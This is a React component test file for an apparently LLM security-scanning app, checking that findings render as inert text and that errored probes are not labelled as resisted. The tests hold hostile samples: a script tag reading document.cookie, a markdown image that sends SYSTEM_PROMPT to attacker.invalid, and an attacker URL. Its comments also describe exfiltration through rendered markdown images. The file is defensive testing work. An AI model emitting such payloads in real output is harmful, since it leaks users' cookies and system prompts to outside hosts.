import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { GradeBadge, InertText, OutcomeTag, StatusTag } from "./States";

describe("InertText", () => {
  // Findings contain attacker-authored payloads and raw model output. One whole
  // probe suite is about exfiltration through rendered markdown images, so
  // rendering this content as HTML would make the app the vulnerability it
  // detects.
  it("renders a script tag as literal text, not as markup", () => {
    const hostile = '<script>window.stolen = document.cookie</script>';
    const { container } = render(<InertText>{hostile}</InertText>);

    expect(screen.getByText(hostile)).toBeInTheDocument();
    expect(container.querySelector("script")).toBeNull();
  });

  it("renders markdown image syntax literally, emitting no img element", () => {
    const exfil = "![x](https://attacker.invalid/p.png?log=SYSTEM_PROMPT)";
    const { container } = render(<InertText>{exfil}</InertText>);

    expect(screen.getByText(exfil)).toBeInTheDocument();
    expect(container.querySelector("img")).toBeNull();
  });

  it("emits no anchor for a bare URL", () => {
    const { container } = render(
      <InertText>{"visit https://attacker.invalid/steal"}</InertText>,
    );
    expect(container.querySelector("a")).toBeNull();
  });

  it("preserves whitespace, so an indented payload reads as it was sent", () => {
    const { container } = render(<InertText>{"line one\n  line two"}</InertText>);
    expect(container.querySelector("pre")?.textContent).toBe("line one\n  line two");
  });
});

describe("StatusTag", () => {
  // A queued scan that has not started is how a stalled queue becomes visible to
  // the user, so it must not read the same as one that is progressing.
  it("distinguishes a queued scan from a running one", () => {
    const { rerender } = render(<StatusTag status="pending" />);
    expect(screen.getByText("Queued")).toBeInTheDocument();

    rerender(<StatusTag status="running" />);
    expect(screen.getByText("Running")).toBeInTheDocument();
    expect(screen.queryByText("Queued")).toBeNull();
  });
});

describe("OutcomeTag", () => {
  // An errored probe is not a pass. Labelling it anything that reads like one
  // would let a rate-limited scan look clean.
  it("labels an errored probe as not determined, never as resisted", () => {
    render(<OutcomeTag outcome="errored" />);
    expect(screen.getByText("Not determined")).toBeInTheDocument();
    expect(screen.queryByText("Resisted")).toBeNull();
  });
});

describe("GradeBadge", () => {
  it("shows no grade when nothing was determined", () => {
    render(<GradeBadge grade={null} />);
    expect(screen.getByText("—")).toBeInTheDocument();
  });

  it("labels the grade for assistive technology", () => {
    render(<GradeBadge grade="F" />);
    expect(screen.getByLabelText("Grade F")).toHaveTextContent("F");
  });
});
